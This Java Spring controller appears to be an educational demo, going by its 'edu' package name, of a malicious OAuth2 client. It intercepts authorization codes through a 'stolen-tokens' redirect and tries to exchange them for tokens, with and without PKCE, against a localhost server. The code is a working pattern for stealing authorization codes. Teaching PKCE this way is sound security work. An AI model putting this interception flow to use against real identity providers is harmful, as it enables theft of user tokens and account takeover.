package edu.sde.maliciousclient.controller;

@Controller
public class MaliciousClientController {
    
    // Attempt to intercept authorization code without PKCE
    @GetMapping("/intercept-authorization")
    public String interceptAuthorization() {
        // Try traditional client (without PKCE)
        String authorizationUrl = "http://localhost:9000/oauth2/authorize?" +
            "response_type=code&" +
            "client_id=traditional-client&" +
            "redirect_uri=http://localhost:8082/stolen-tokens&" +
            "scope=openid%20profile&" +
            "state=malicious-state";
        
        return "redirect:" + authorizationUrl;
    }
    
    // Attempt PKCE attack (this should fail)
    @GetMapping("/pkce-attack")
    public String attemptPkceAttack() {
        String state = "malicious-pkce-state";
        
        String authorizationUrl = "http://localhost:9000/oauth2/authorize?" +
            "response_type=code&" +
            "client_id=pkce-client&" +
            "redirect_uri=http://localhost:8082/stolen-tokens&" +
            "scope=openid%20profile%20read%20write&" +
            "state=" + state + "&" +
            "code_challenge=malicious-challenge&" + // Invalid challenge
            "code_challenge_method=S256";
        
        return "redirect:" + authorizationUrl;
    }
    
    @GetMapping("/stolen-tokens")
    public String handleStolenCode(@RequestParam String code, 
                                 @RequestParam(required = false) String state,
                                 Model model) {
        model.addAttribute("interceptedCode", code);
        model.addAttribute("state", state);
        
        // Attempt to exchange stolen code (this will fail with PKCE)
        if (state != null && state.equals("malicious-state")) {
            try {
                String tokenResponse = exchangeStolenCode(code);
                model.addAttribute("tokenResponse", tokenResponse);
                model.addAttribute("attackSuccess", true);
            } catch (Exception e) {
                model.addAttribute("error", e.getMessage());
                model.addAttribute("attackSuccess", false);
            }
        }
        
        return "attack-result";
    }
    
    private String exchangeStolenCode(String code) {
        WebClient webClient = WebClient.builder().build();
        
        try {
            return webClient.post()
                .uri("http://localhost:9000/oauth2/token")
                .header(HttpHeaders.CONTENT_TYPE, MediaType.APPLICATION_FORM_URLENCODED_VALUE)
                .body(BodyInserters.fromFormData("grant_type", "authorization_code")
                    .with("client_id", "traditional-client") // Try traditional client
                    .with("code", code)
                    .with("redirect_uri", "http://localhost:8082/stolen-tokens"))
                .retrieve()
                .bodyToMono(String.class)
                .block();
        } catch (Exception e) {
            throw new RuntimeException("Token exchange failed: " + e.getMessage());
        }
    }
}